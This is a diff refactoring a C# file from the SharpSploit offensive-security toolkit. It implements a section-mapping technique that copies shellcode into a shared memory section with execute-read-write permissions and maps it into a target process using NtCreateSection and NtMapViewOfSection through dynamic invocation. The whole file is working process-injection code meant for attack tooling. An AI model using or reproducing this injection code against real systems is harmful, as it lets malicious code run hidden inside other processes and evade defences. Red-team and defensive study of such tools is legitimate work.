@@ -1,5 +1,7 @@
 ﻿using System;
 using System.Linq;
+using System.Reflection;
+using System.Diagnostics;
 
 namespace SharpSploit.Execution.Injection
 {
@@ -8,75 +10,74 @@ namespace SharpSploit.Execution.Injection
     /// </summary>
     public abstract class AllocationTechnique
     {
-        //An array containing a set of PayloadType objects that are supported.
+        // An array containing a set of PayloadType objects that are supported.
         protected Type[] supportedPayloads;
 
         /// <summary>
         /// Informs objects using this technique whether or not it supports the type of a particular payload.
         /// </summary>
         /// <author>The Wover (@TheRealWover)</author>
-        /// <param name="payload">A payload.</param>
+        /// <param name="Payload">A payload.</param>
         /// <returns>Whether or not the payload is of a supported type for this strategy.</returns>
-        public abstract bool IsSupportedPayloadType(PayloadType payload);
+        public abstract bool IsSupportedPayloadType(PayloadType Payload);
 
         /// <summary>
         /// Internal method for setting the supported payload types. Used in constructors.
         /// </summary>
         /// <author>The Wover (@TheRealWover)</author>
-        abstract internal void DefineSupportedPayloadTypes();
+        internal abstract void DefineSupportedPayloadTypes();
 
         /// <summary>
         /// Allocate the payload to the target process at a specified address.
         /// </summary>
         /// <author>The Wover (@TheRealWover)</author>
-        /// <param name="payload">The payload to allocate to the target process.</param>
-        /// <param name="process">The target process.</param>
-        /// <param name="address">The address at which to allocate the payload in the target process.</param>
-        /// <returns>True when allocation was successful. Otherwise, throws relevant exceptions./returns>
-        public IntPtr Allocate(PayloadType payload, System.Diagnostics.Process process, IntPtr address)
+        /// <param name="Payload">The payload to allocate to the target process.</param>
+        /// <param name="Process">The target process.</param>
+        /// <param name="Address">The address at which to allocate the payload in the target process.</param>
+        /// <returns>True when allocation was successful. Otherwise, throws relevant exceptions.</returns>
+        public virtual IntPtr Allocate(PayloadType Payload, Process Process, IntPtr Address)
         {
-            Type[] funcPrototype = new Type[] { payload.GetType(), typeof(System.Diagnostics.Process), address.GetType() };
+            Type[] funcPrototype = new Type[] { Payload.GetType(), typeof(Process), Address.GetType() };
 
             try
             {
-                //Get delegate to the overload of Allocate that supports the type of payload passed in
-                System.Reflection.MethodInfo allocate = this.GetType().GetMethod("Allocate", funcPrototype);
+                // Get delegate to the overload of Allocate that supports the type of payload passed in
+                MethodInfo allocate = this.GetType().GetMethod("Allocate", funcPrototype);
 
-                //Dynamically invoke the appropriate Allocate overload
-                return (IntPtr)allocate.Invoke(this, new object[] { payload, process, address });
+                // Dynamically invoke the appropriate Allocate overload
+                return (IntPtr)allocate.Invoke(this, new object[] { Payload, Process, Address });
             }
-            //If there is no such method
+            // If there is no such method
             catch (ArgumentNullException)
             {
-                throw new PayloadTypeNotSupported(payload.GetType());
+                throw new PayloadTypeNotSupported(Payload.GetType());
             }
         }
-
 
         /// <summary>
         /// Allocate the payload to the target process.
         /// </summary>
         /// <author>The Wover (@TheRealWover)</author>
-        /// <param name="payload">The payload to allocate to the target process.</param>
-        /// <param name="process">The target process.</param>
+        /// <param name="Payload">The payload to allocate to the target process.</param>
+        /// <param name="Process">The target process.</param>
         /// <returns>Base address of allocated memory within the target process's virtual memory space.</returns>
-        public IntPtr Allocate(PayloadType payload, System.Diagnostics.Process process)
+        public virtual IntPtr Allocate(PayloadType Payload, Process Process)
         {
 
-            Type[] funcPrototype = new Type[] { payload.GetType(), typeof(System.Diagnostics.Process) };
+            Type[] funcPrototype = new Type[] { Payload.GetType(), typeof(Process) };
 
             try
             {
-                //Get delegate to the overload of Allocate that supports the type of payload passed in
-                System.Reflection.MethodInfo allocate = this.GetType().GetMethod("Allocate", funcPrototype);
+                // Get delegate to the overload of Allocate that supports the type of payload passed in
+                MethodInfo allocate = this.GetType().GetMethod("Allocate", funcPrototype);
 
-                //Dynamically invoke the appropriate Allocate overload
-                return (IntPtr)allocate.Invoke(this, new object[] { payload, process });
+                // Dynamically invoke the appropriate Allocate overload
+                return (IntPtr)allocate.Invoke(this, new object[] { Payload, Process });
             }
-            //If there is no such method
+            // If there is no such method
             catch (ArgumentNullException)
             {
-                throw new PayloadTypeNotSupported(payload.GetType());
+                throw new PayloadTypeNotSupported(Payload.GetType());
             }
         }
     }
@@ -86,7 +87,7 @@ namespace SharpSploit.Execution.Injection
     /// </summary>
     public class SectionMapAlloc : AllocationTechnique
     {
-        //Publically accessible options
+        // Publically accessible options
 
         public uint localSectionPermissions = Win32.WinNT.PAGE_EXECUTE_READWRITE;
         public uint remoteSectionPermissions = Win32.WinNT.PAGE_EXECUTE_READWRITE;
@@ -97,9 +98,7 @@ namespace SharpSploit.Execution.Injection
         /// </summary>
         public SectionMapAlloc()
         {
-
             DefineSupportedPayloadTypes();
-
         }
 
         /// <summary>
@@ -107,10 +106,7 @@ namespace SharpSploit.Execution.Injection
         /// </summary>
         public SectionMapAlloc(uint localPerms = Win32.WinNT.PAGE_EXECUTE_READWRITE, uint remotePerms = Win32.WinNT.PAGE_EXECUTE_READWRITE, uint atts = Win32.WinNT.SEC_COMMIT)
         {
-
             DefineSupportedPayloadTypes();
-
-            //Set options
             localSectionPermissions = localPerms;
             remoteSectionPermissions = remotePerms;
             sectionAttributes = atts;
@@ -120,11 +116,11 @@ namespace SharpSploit.Execution.Injection
         /// States whether the payload is supported.
         /// </summary>
         /// <author>The Wover (@TheRealWover)</author>
-        /// <param name="payload">Payload that will be allocated.</param>
+        /// <param name="Payload">Payload that will be allocated.</param>
         /// <returns></returns>
-        public override bool IsSupportedPayloadType(PayloadType payload)
+        public override bool IsSupportedPayloadType(PayloadType Payload)
         {
-            return supportedPayloads.Contains(payload.GetType());
+            return supportedPayloads.Contains(Payload.GetType());
         }
 
         /// <summary>
@@ -144,59 +140,58 @@ namespace SharpSploit.Execution.Injection
         /// Allocate the payload to the target process. Handles unknown payload types.
         /// </summary>
         /// <author>The Wover (@TheRealWover)</author>
-        /// <param name="payload">The payload to allocate to the target process.</param>
-        /// <param name="process">The target process.</param>
+        /// <param name="Payload">The payload to allocate to the target process.</param>
+        /// <param name="Process">The target process.</param>
         /// <returns>Base address of allocated memory within the target process's virtual memory space.</returns>
-        public IntPtr Allocate(PayloadType payload, System.Diagnostics.Process process)
+        public override IntPtr Allocate(PayloadType Payload, Process Process)
         {
-            if (IsSupportedPayloadType(payload))
+            if (!IsSupportedPayloadType(Payload))
             {
-                return Allocate(payload, process, IntPtr.Zero);
+                throw new PayloadTypeNotSupported(Payload.GetType());
             }
-            else
-                throw new PayloadTypeNotSupported(payload.GetType());
+            return Allocate(Payload, Process, IntPtr.Zero);
         }
 
         /// <summary>
         /// Allocate the payload in the target process.
         /// </summary>
         /// <author>The Wover (@TheRealWover)</author>
-        /// <param name="payload">The PIC payload to allocate to the target process.</param>
-        /// <param name="process">The target process.</param>
-        /// <param name="preferredAddress">The preferred address at which to allocate the payload in the target process.</param>
+        /// <param name="Payload">The PIC payload to allocate to the target process.</param>
+        /// <param name="Process">The target process.</param>
+        /// <param name="PreferredAddress">The preferred address at which to allocate the payload in the target process.</param>
         /// <returns>Base address of allocated memory within the target process's virtual memory space.</returns>
-        public IntPtr Allocate(PICPayload payload, System.Diagnostics.Process process, IntPtr preferredAddress)
+        public IntPtr Allocate(PICPayload Payload, Process Process, IntPtr PreferredAddress)
         {
+            // Get a convenient handle for the target process.
+            IntPtr procHandle = Process.Handle;
 
-            //Get a convenient handle for the target process.
-            IntPtr procHandle = process.Handle;
+            // Create a section to hold our payload
+            IntPtr sectionAddress = CreateSection((uint)Payload.Payload.Length, sectionAttributes);
 
-            //Create a section to hold our payload
-            IntPtr sectionAddress = CreateSection((uint)payload.Payload.Length, sectionAttributes);
+            // Map a view of the section into our current process with RW permissions
+            SectionDetails details = MapSection(Process.GetCurrentProcess().Handle, sectionAddress,
+                localSectionPermissions, IntPtr.Zero, Convert.ToUInt32(Payload.Payload.Length));
 
-            //Map a view of the section into our current process with RW permissions
-            SectionDetails details = MapSection(System.Diagnostics.Process.GetCurrentProcess().Handle, sectionAddress,
-                localSectionPermissions, IntPtr.Zero, Convert.ToUInt32(payload.Payload.Length));
+            // Copy the shellcode to the local view
+            System.Runtime.InteropServices.Marshal.Copy(Payload.Payload, 0, details.baseAddr, Payload.Payload.Length);
 
-            //Copy the shellcode to the local view
-            System.Runtime.InteropServices.Marshal.Copy(payload.Payload, 0, details.baseAddr, payload.Payload.Length);
+            // Now that we are done with the mapped view in our own process, unmap it
+            Native.NTSTATUS result = UnmapSection(Process.GetCurrentProcess().Handle, details.baseAddr);
 
-            //Now that we are done with the mapped view in our own process, unmap it
-            Native.NTSTATUS result = UnmapSection(System.Diagnostics.Process.GetCurrentProcess().Handle, details.baseAddr);
-
-            //Now, map a view of the section to other process. It should already hold the payload.
+            // Now, map a view of the section to other process. It should already hold the payload.
 
             SectionDetails newDetails;
 
-            if (preferredAddress != IntPtr.Zero)
-                newDetails = MapSection(procHandle, sectionAddress,
-                    remoteSectionPermissions, preferredAddress, (ulong)payload.Payload.Length);
-            //Attempt to allocate at a preferred address. May not end up exactly at the specified location.
-            //Refer to MSDN documentation on ZwMapViewOfSection for details.
+            if (PreferredAddress != IntPtr.Zero)
+            {
+                // Attempt to allocate at a preferred address. May not end up exactly at the specified location.
+                // Refer to MSDN documentation on ZwMapViewOfSection for details.
+                newDetails = MapSection(procHandle, sectionAddress, remoteSectionPermissions, PreferredAddress, (ulong)Payload.Payload.Length);
+            }
             else
-                newDetails = MapSection(procHandle, sectionAddress,
-                    remoteSectionPermissions, IntPtr.Zero, (ulong)payload.Payload.Length);
-
+            {
+                newDetails = MapSection(procHandle, sectionAddress, remoteSectionPermissions, IntPtr.Zero, (ulong)Payload.Payload.Length);
+            }
             return newDetails.baseAddr;
         }
 
@@ -209,18 +204,25 @@ namespace SharpSploit.Execution.Injection
         /// <returns></returns>
         private static IntPtr CreateSection(ulong size, uint allocationAttributes)
         {
-            //Create a pointer for the section handle
+            // Create a pointer for the section handle
             IntPtr SectionHandle = new IntPtr();
             ulong maxSize = size;
 
-            Native.NTSTATUS result = DynamicInvoke.Native.NtCreateSection(ref SectionHandle, 0x10000000, IntPtr.Zero, ref maxSize,
-                Win32.WinNT.PAGE_EXECUTE_READWRITE, allocationAttributes, IntPtr.Zero);
-
-            //Perform error checking on the result
-            if (result >= 0)
-                return SectionHandle;
-            else
+            Native.NTSTATUS result = DynamicInvoke.Native.NtCreateSection(
+                ref SectionHandle,
+                0x10000000,
+                IntPtr.Zero,
+                ref maxSize,
+                Win32.WinNT.PAGE_EXECUTE_READWRITE,
+                allocationAttributes,
+                IntPtr.Zero
+            );
+            // Perform error checking on the result
+            if (result < 0)
+            {
                 return IntPtr.Zero;
+            }
+            return SectionHandle;
         }
 
         /// <summary>
@@ -235,21 +237,23 @@ namespace SharpSploit.Execution.Injection
         /// <returns>A struct containing address and size of the mapped view.</returns>
         public static SectionDetails MapSection(IntPtr procHandle, IntPtr sectionHandle, uint protection, IntPtr addr, ulong sizeData)
         {
-            //Create an unsigned int to hold the value of NTSTATUS.
-            UIntPtr ntstatus = new UIntPtr();
-
-            //Copied so that they may be passed by reference but the original value preserved
+            // Copied so that they may be passed by reference but the original value preserved
             IntPtr baseAddr = addr;
             ulong size = sizeData;
 
             uint disp = 2;
             uint alloc = 0;
 
-            //Returns an NTSTATUS value
-            Native.NTSTATUS result = DynamicInvoke.Native.NtMapViewOfSection(sectionHandle, procHandle, ref baseAddr, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref size, disp, alloc,
-                protection);
+            // Returns an NTSTATUS value
+            Native.NTSTATUS result = DynamicInvoke.Native.NtMapViewOfSection(
+                sectionHandle, procHandle,
+                ref baseAddr,
+                IntPtr.Zero, IntPtr.Zero, IntPtr.Zero,
+                ref size, disp, alloc,
+                protection
+            );
 
-            //Create a struct to hold the results.
+            // Create a struct to hold the results.
             SectionDetails details = new SectionDetails(baseAddr, sizeData);
 
             return details;
@@ -261,7 +265,6 @@ namespace SharpSploit.Execution.Injection
         /// </summary>
         public struct SectionDetails
         {
-
             public IntPtr baseAddr;
             public ulong size;
 
@@ -281,7 +284,7 @@ namespace SharpSploit.Execution.Injection
         /// <returns></returns>
         public static Native.NTSTATUS UnmapSection(IntPtr hProc, IntPtr baseAddr)
         {
-            return (Native.NTSTATUS)DynamicInvoke.Native.NtUnmapViewOfSection(hProc, baseAddr);
+            return DynamicInvoke.Native.NtUnmapViewOfSection(hProc, baseAddr);
         }
-    }//end class
+    }
 }
